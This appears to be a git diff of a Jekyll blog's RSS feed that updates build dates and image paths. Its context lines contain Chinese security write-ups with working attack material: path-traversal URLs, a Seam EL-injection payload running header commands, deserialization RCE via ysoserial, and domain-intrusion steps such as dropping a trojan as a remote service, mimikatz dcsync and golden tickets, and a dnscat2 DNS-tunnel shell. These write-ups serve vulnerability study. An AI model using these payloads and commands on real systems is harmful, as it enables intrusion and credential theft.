@@ -5,8 +5,8 @@
     <description>Something Specail</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 11 Apr 2018 10:35:42 +0800</pubDate>
-    <lastBuildDate>Wed, 11 Apr 2018 10:35:42 +0800</lastBuildDate>
+    <pubDate>Wed, 24 Oct 2018 14:46:49 +0800</pubDate>
+    <lastBuildDate>Wed, 24 Oct 2018 14:46:49 +0800</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
     
       <item>
@@ -38,9 +38,9 @@
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;registry.addResourceHandler(&quot;/resources/**&quot;).addResourceLocations(&quot;file:///D:/static/&quot;,&quot;/resources/&quot;);
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;当前漏洞环境在D盘，我在D盘根目录创建一个123.txt，通过下面的URL即可访问。 &lt;a href=&quot;http://127.0.0.1:8080/spring-mvc-showcase/resources/xxxx/..%5c/..%5c/..%5c/123.txt&quot;&gt;http://127.0.0.1:8080/spring-mvc-showcase/resources/xxxx/..%5c/..%5c/..%5c/123.txt&lt;/a&gt;
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-04-11-21-48-47.jpg&quot; alt=&quot;21-48-47&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-04-11-21-48-47.jpg&quot; alt=&quot;21-48-47&quot; /&gt;
 漏洞只能在windows上存在原因是因为为在&lt;code class=&quot;highlighter-rouge&quot;&gt;org/springframework/web/servlet/resource/ResourceHttpRequestHandler&lt;/code&gt;中的&lt;code class=&quot;highlighter-rouge&quot;&gt;String path = (String) request.getAttribute(HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE);&lt;/code&gt;会将URL中的&lt;code class=&quot;highlighter-rouge&quot;&gt;..%2f&lt;/code&gt;去除,然后在Windows中能通过..\的方式来跳目录。然后不支持Tomcat的原因为在默认情况下Tomcat遇到包含%2f() %5c(/)的URL直接http 400，若需要处理此类型的URL 则需要在tomcat配置文件中添加&lt;code class=&quot;highlighter-rouge&quot;&gt;Dorg.apache.tomcat.util.buf.UDecoder.ALLOW_ENCODED_SLASH=true&lt;/code&gt;   Spring Framework处理资源文件的整个流程如下图：
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-04-11-21-43-23.jpg&quot; alt=&quot;21-43-23&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2018-04-11-21-43-23.jpg&quot; alt=&quot;21-43-23&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;在经过一系列判断之后在&lt;code class=&quot;highlighter-rouge&quot;&gt;org/springframework/util/ResourceUtils&lt;/code&gt;中的&lt;code class=&quot;highlighter-rouge&quot;&gt;getFile&lt;/code&gt;方法读取了文件。值得注意的是在虽然在存在URL检查中存在如下代码&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (path.contains(&quot;WEB-INF&quot;) || path.contains(&quot;META-INF&quot;)) {
@@ -51,7 +51,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;但是在Windows平台下是不会区分大小写的，所以还是可以读取配置文件。但是如何构造URL得看在配置资源文件中设置的location是在何处了。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-04-11-22-07-52.jpg&quot; alt=&quot;22-07-52&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2018-04-11-22-07-52.jpg&quot; alt=&quot;22-07-52&quot; /&gt;
 官方修复方式是在&lt;code class=&quot;highlighter-rouge&quot;&gt;CheckResource&lt;/code&gt;方法中添加了如下过滤&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;protected String processPath(String path) {
 		path = StringUtils.replace(path, &quot;\\&quot;, &quot;/&quot;);
@@ -129,7 +129,7 @@ untime').getDeclaredMethods()[7].invoke(null), 'command')&lt;/code&gt;
    }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;在http请求中获取&lt;code class=&quot;highlighter-rouge&quot;&gt;actionOutcome&lt;/code&gt;后传入了&lt;code class=&quot;highlighter-rouge&quot;&gt;handleOutcome&lt;/code&gt;在此调用了&lt;code class=&quot;highlighter-rouge&quot;&gt;facesContext.getApplication().getNavigationHandler().handleNavigation&lt;/code&gt;其中handleNavigation是对JSF中&lt;code class=&quot;highlighter-rouge&quot;&gt;NavigationHandler&lt;/code&gt;这个抽象类的实现，在&lt;code class=&quot;highlighter-rouge&quot;&gt;org.jboss.seam.jsf.seamNavigationHandler.handleNavigation&lt;/code&gt;方法中进入了&lt;code class=&quot;highlighter-rouge&quot;&gt;FacesManager.instance().interpolateAndRedirect()&lt;/code&gt;最后在此方法中的&lt;code class=&quot;highlighter-rouge&quot;&gt;Interpolator.instance().interpolate&lt;/code&gt;进行了表达式的解析。测试如下图所示
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-27-15221387286515.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-03-27-15221387286515.jpg&quot; alt=&quot;&quot; /&gt;
 该漏洞后续修复方式为在actionOutcome中检查是否包含&lt;code class=&quot;highlighter-rouge&quot;&gt;#{&lt;/code&gt;等字符来防止表达式注入。虽然这样是直接杜绝了在actionOutcome参数中进行表达式注入，但是我们注意下面的代码&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(outcome == null) {
                 String actionId = (String)facesContext.getExternalContext().getRequestParameterMap().get(&quot;actionMethod&quot;);
@@ -204,7 +204,7 @@ var DESC=&quot;#{util.escape(sessionScope['user'].getDescription())}&quot;;
 &amp;lt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;其中DESC我们可以自己设置，首先将我们的DESC设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;?x=#{expressions.instance().createValueExpression(request.getHeader('cmd')).getValue()}&lt;/code&gt;其含义就是获取请求头中的cmd。然后在请求&lt;code class=&quot;highlighter-rouge&quot;&gt;template.seam?actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription())&lt;/code&gt;通过前面的代码分析我们知道其实就是去执行&lt;code class=&quot;highlighter-rouge&quot;&gt;util.escape(sessionScope['user'].getDescription())&lt;/code&gt;这个表达式，将此表达式执行的结果赋值给了&lt;code class=&quot;highlighter-rouge&quot;&gt;outname&lt;/code&gt;，然后将&lt;code class=&quot;highlighter-rouge&quot;&gt;outname&lt;/code&gt;传递给&lt;code class=&quot;highlighter-rouge&quot;&gt;handleOutcome&lt;/code&gt;方法，又执行了一次表达式。所以这是一个EL表达式二次执行的问题。此处执行的表达式就是DESC设置的表达式，因为在DESC中通过表达式再次实例化了一个表达式执行的实例，所以cmd中的表达式得到执行。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-28-15222283869796.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2018-03-28-15222283869796.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;cve-2013-2165&quot;&gt;CVE-2013-2165&lt;/h2&gt;
 &lt;p&gt;seam框架在2.2.1版本时使用的richfaces的版本为3.3.3.Final，此版本存在一处Java反序列化漏洞。因此这个漏洞也直接影响seam框架，通过这个漏洞我们可以直接实现RCE。下面简单分析一下此漏洞，该漏洞核心源码是 org.ajax4jsf.resource.ResourceBuilderImpl&lt;/p&gt;
@@ -255,16 +255,16 @@ public Object getResourceDataForKey(String key) {
     }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;这段代码很简单，就是将传递过来的key进行解密之后的数据传入了readObject方法从而导致RCE。那么问题是这个key是如何输入的呢？这就是涉及到richfaces这个库了。这个库会去处理在URL中以/a4j/开头的路径，当你请求http://test.com/a4j/xxx 之后，中间件会将/a4j/xxxx 传递给richfaces这个库去处理后面的数据。具体代码为
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-27-15221228205237.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-03-27-15221228205237.jpg&quot; alt=&quot;&quot; /&gt;
 继续构造&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/a4j/g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js/DATA/xxxx 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;这种格式的URL之后richfaces会将/a4j/a/3_3_3.Final先去除，这是个根据版本信息所产生的标识，然后找到org/richfaces/renderkit/html/scripts/skinning.js/此资源之后将后面的参数传入了getResourceDataForKey当中，然后/DATA/之后的数据经过一个decrypt方法之后就进入了readObject方法。其具体调用链如下:
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-27-15220710395443.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-03-27-15220710395443.jpg&quot; alt=&quot;&quot; /&gt;
 明白漏洞流程之后就可以直接通过ysoserial来进行RCE了。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-27-15220712257975.jpg&quot; alt=&quot;&quot; /&gt;
-richfaces开发团队在richfaces3.3.4.Final对此漏洞进行了修复，修复方案是在反序列化时检测了类是否在白名单内。白名单文件在org.ajax4jsf.resource.resource-serialization.properties 大概看了一下似乎默认的这些类都无法利用起来。&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-27-15221303506179.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2018-03-27-15220712257975.jpg&quot; alt=&quot;&quot; /&gt;
+richfaces开发团队在richfaces3.3.4.Final对此漏洞进行了修复，修复方案是在反序列化时检测了类是否在白名单内。白名单文件在org.ajax4jsf.resource.resource-serialization.properties 大概看了一下似乎默认的这些类都无法利用起来。&lt;img src=&quot;/old_img/2018-03-27-15221303506179.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;cve-2013-3827&quot;&gt;CVE-2013-3827&lt;/h2&gt;
 &lt;p&gt;这个path traversal是在Mojarra2.0-2.1.18之间都存在，由于seam Framework 2.3.1 Final中Mojarra版本为2.1.7，所以存在此漏洞。但是seam Framework 2.2.1 Final使用的是Mojarra1.2.12所以不存在此漏洞。在分析漏洞成因之前需要了解一下seam框架的处理流程，通常在web.xml中能看到如下配置&lt;/p&gt;
@@ -296,7 +296,7 @@ richfaces开发团队在richfaces3.3.4.Final对此漏洞进行了修复，修复
 	&amp;lt;/servlet-mapping&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;当一个请求为 http://target.com/javax.faces.resource/xxxx 时，首先要经过 seam Filter的判断，只有在seam框架内部的filter处理完成之后才会将对应的请求发送给Mojarra处理。下面这张调用栈的图就很好的展示了整个流程
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-28-15222171907906.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-03-28-15222171907906.jpg&quot; alt=&quot;&quot; /&gt;
 漏洞的触发点是在Mojarra对资源文件请求的处理过程，其中&lt;code class=&quot;highlighter-rouge&quot;&gt;com.sun.faces.application.resource.WebappResourceHelper.findResource&lt;/code&gt;是处理资源路径的关键方法，在此方法中完成了路径的拼接。&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  if (library != null) {
@@ -344,13 +344,13 @@ richfaces开发团队在richfaces3.3.4.Final对此漏洞进行了修复，修复
         }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;这段代码中先是得到resourceId的值为&lt;code class=&quot;highlighter-rouge&quot;&gt;/javax.faces.resource/xxxx&lt;/code&gt;，再判断了资源文件类型，默认情况下以下几种类型的文件是无法访问
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-28-15222182213175.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-03-28-15222182213175.jpg&quot; alt=&quot;&quot; /&gt;
 所以该漏洞默认情况下是无法读取以上几种文件的内容。&lt;code class=&quot;highlighter-rouge&quot;&gt;resourceName&lt;/code&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;resourceName = resourceId.substring(RESOURCE_IDENTIFIER.length() + 1)&lt;/code&gt;赋值，若我们将请求设置为 http://target.com/javax.faces.resource…/WEB-INF/web.xml.seam 那么&lt;code class=&quot;highlighter-rouge&quot;&gt;resourceName&lt;/code&gt;就为&lt;code class=&quot;highlighter-rouge&quot;&gt;../WEB-INF/web.xml&lt;/code&gt;了。再通过后面&lt;code class=&quot;highlighter-rouge&quot;&gt;findResource&lt;/code&gt;方法的拼接最后&lt;code class=&quot;highlighter-rouge&quot;&gt;basepath&lt;/code&gt;的值就为&lt;code class=&quot;highlighter-rouge&quot;&gt;/resources/../WEB-INF/web.xml&lt;/code&gt;因而成功读取到web.xml里面的数据了。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-28-15222200461324.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-03-28-15222200461324.jpg&quot; alt=&quot;&quot; /&gt;
 除此之外还有另外一种利用方式，其实过程也大同小异。就是利用&lt;code class=&quot;highlighter-rouge&quot;&gt;libraryName&lt;/code&gt; 来进行跳目录，其赋值方式为&lt;code class=&quot;highlighter-rouge&quot;&gt;libraryName=context.getExternalContext().getRequestParameterMap().get(&quot;ln&quot;);&lt;/code&gt;将请求的URL改为 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://target.com/javax.faces.resource/javax.faces.resource./WEB-INF/web.xml.seam?ln=..&lt;/code&gt; 然后basepath通过&lt;code class=&quot;highlighter-rouge&quot;&gt;basePath = library.getPath() + '/' + resourceName;&lt;/code&gt;赋值为&lt;code class=&quot;highlighter-rouge&quot;&gt;/resources/../WEB-INF/web.xml&lt;/code&gt;也一样读取到了web.xml的内容了。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-28-15222206254018.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2018-03-28-15222206254018.jpg&quot; alt=&quot;&quot; /&gt;
 其实在第二种利用方式中，程序本身检查通过&lt;code class=&quot;highlighter-rouge&quot;&gt;libraryNameContainsForbiddenSequence&lt;/code&gt;检测了&lt;code class=&quot;highlighter-rouge&quot;&gt;libraryName&lt;/code&gt;的值，但是黑名单字符中不包含&lt;code class=&quot;highlighter-rouge&quot;&gt;..&lt;/code&gt; 官方在后面的修复方案就是将&lt;code class=&quot;highlighter-rouge&quot;&gt;..&lt;/code&gt;加入黑名单并且同时检查了&lt;code class=&quot;highlighter-rouge&quot;&gt;resourceName&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;libraryName&lt;/code&gt;是否合法。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2018-03-28-15222210619941.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2018-03-28-15222210619941.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&quot;http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html&quot;&gt;cve-2010-1871-jboss-seam-framework&lt;/a&gt;&lt;/p&gt;
@@ -421,8 +421,8 @@ Content-Length: 777
   &amp;lt;soapenv:Body/&amp;gt; 
 &amp;lt;/soapenv:Envelope&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139326533815.jpg&quot; alt=&quot;&quot; /&gt;
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139326768139.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-12-23-15139326533815.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2017-12-23-15139326768139.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2 id=&quot;0x02漏洞分析&quot;&gt;0x02漏洞分析&lt;/h2&gt;
 &lt;p&gt;此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。然后在&lt;/p&gt;
 
@@ -440,11 +440,11 @@ weblogic.wsee.workarea.WorkContextXmlInputAdapter
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139338809033.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2017-12-23-15139338809033.jpg&quot; alt=&quot;&quot; /&gt;
 获取到localHeader1后传递给readHeaderOld方法，其内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;work:WorkContext&amp;gt;&lt;/code&gt;所包裹的数据，然后继续跟进weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139340157538.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2017-12-23-15139340157538.jpg&quot; alt=&quot;&quot; /&gt;
 在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，最后通过XMLDecoder来进行反序列化操作。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139341082935.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2017-12-23-15139341082935.jpg&quot; alt=&quot;&quot; /&gt;
 关于XMLDecoder的反序化问题13年就已经被人发现，近期再次被利用到Weblogic中由此可见JAVA生态圈中的安全问题是多么糟糕。值得一提的是此次漏洞出现了两处CVE编号，因为在Oracle官方在修复CVE-2017-3506所提供的patch只是简单的检查了XML中是否包含了&lt;object&gt;节点，然后将&lt;object&gt;换为&lt;void&gt;即可绕过此补丁。因此在修复过程中用户一定要使用Oracle官方十月份所提供的patch。&lt;/void&gt;&lt;/object&gt;&lt;/object&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;0x03漏洞防御&quot;&gt;0x03漏洞防御&lt;/h2&gt;
@@ -529,8 +529,8 @@ dsquery computer
 net group &quot;Domain Computers&quot; /domain
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816910178725.jpg&quot; alt=&quot;&quot; /&gt;
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816926950901.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-03-20-14816910178725.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/old_img/2017-03-20-14816926950901.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;还可以通过powershell进行信息搜集,收集的信息包括域控机器，网段信息，域内服务列表。使用powershell的话，首先要绕过默认的安全策略，具体看文章&lt;a href=&quot;https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/&quot;&gt;https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/&lt;/a&gt;&lt;/p&gt;
 
@@ -541,7 +541,7 @@ net group &quot;Domain Computers&quot; /domain
 域内服务信息收集，在域环境中其实无需做端口扫描。直接通过SPN进行信息收集，具体脚本&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices.ps1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816932370016.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-03-20-14816932370016.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;0x02域内权限获取&quot;&gt;0x02域内权限获取&lt;/h4&gt;
 
@@ -559,7 +559,7 @@ net group &quot;Domain Computers&quot; /domain
 
 &lt;p&gt;4.steal token
 当你获取了本地计算机的system权限后，如果这台机器上有域用户跑的进程，就直接可以窃取域账号的token，然后从本地用户组跨入域环境。如果这台机器上有域管的开的进程，那么直接steal token后就可以登录域控了。
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816940742419.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2017-03-20-14816940742419.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;5.远程执行命令方法&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy muma.exe \\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件
@@ -590,7 +590,7 @@ sc \\host delete foobar ##完事后删除服务
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;PTH+compmgmt.msc
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816949000256.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2017-03-20-14816949000256.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;smb+MOF&lt;/p&gt;
 
@@ -695,7 +695,7 @@ krbgt ntml hash   mimikatz “@lsadump::dcsync /domain:域完整名称 /user:krb
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz keberos::ptt ESRINEA.LOCAL.kirbi
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14817917650651.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-03-20-14817917650651.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;ol&gt;
   &lt;li&gt;mimikatz Skeleton Key SSP
@@ -724,11 +724,11 @@ Skeleton Key被安装在64位的域控服务器上，支持Windows Server2003—
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./Responder.py -I eth0 -rPv
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816996917145.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-03-20-14816996917145.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;SMBRelay Attack&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14817720462479.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-03-20-14817720462479.jpg&quot; alt=&quot;&quot; /&gt;
 impacket&lt;/p&gt;
 
 &lt;h3 id=&quot;cobaltstrike工具免杀&quot;&gt;cobaltstrike工具免杀&lt;/h3&gt;
@@ -790,7 +790,7 @@ ruby ./dnscat2.rb
 #docker用户  docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2841831801.png&quot; alt=&quot;2841831801&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2841831801.png&quot; alt=&quot;2841831801&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;可以通过两种方式设置C&amp;amp;C地址，如果没有域名的话，直接在外网VPS运行ruby ./dnscat2.rb 有域名的童鞋，先设置好NS服务器将NS记录修改为当前的机器。然后通过ruby ./dnscat2.rb yourdomain 我这里使用的IP地址&lt;/p&gt;
 
@@ -801,10 +801,10 @@ ruby ./dnscat2.rb
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3501735141.png&quot; alt=&quot;3501735141&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-3501735141.png&quot; alt=&quot;3501735141&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;由于在新版本的dnscat2是加密的所以我们在客户端执行的时候要加上秘钥，不然无法正确的建立连接
-&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-197873402.png&quot; alt=&quot;197873402&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/old_img/2017-04-17-197873402.png&quot; alt=&quot;197873402&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;获取shell&lt;/p&gt;
 
@@ -813,15 +813,15 @@ help #通过help可以看到支持的命令
 shell  #执行之后会新生成一个session  需要通过session -i 2 切过去
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-842306562.png&quot; alt=&quot;842306562&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-842306562.png&quot; alt=&quot;842306562&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;这样就成功获取了一个shell，我们可以通过数据包看一下&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3078174618.png&quot; alt=&quot;3078174618&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-3078174618.png&quot; alt=&quot;3078174618&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;数据都是通过DNS发出去的，并且是加密过的，因为在最初的dnscat2的版本中，数据只是简单的hex编码。到最新版的默认就已经加密&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2981816537.png&quot; alt=&quot;2981816537&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2981816537.png&quot; alt=&quot;2981816537&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;通过Salsa20加密算法进行了加密，如果不知道秘钥，就几乎不能解密数据包了。除了普通的反弹shell和上传下载文件功能，还有一个比较有用的功能
 可以通过dnscat2实现DNS隧道，然后进行内网渗透。在成功获取一个session之后执行&lt;/p&gt;
@@ -830,11 +830,11 @@ shell  #执行之后会新生成一个session  需要通过session -i 2 切过�
 listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4444
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2557060718.png&quot; alt=&quot;2557060718&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/old_img/2017-04-17-2557060718.png&quot; alt=&quot;2557060718&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后直接ssh本地的ip的4444端口&lt;/p&gt;
 
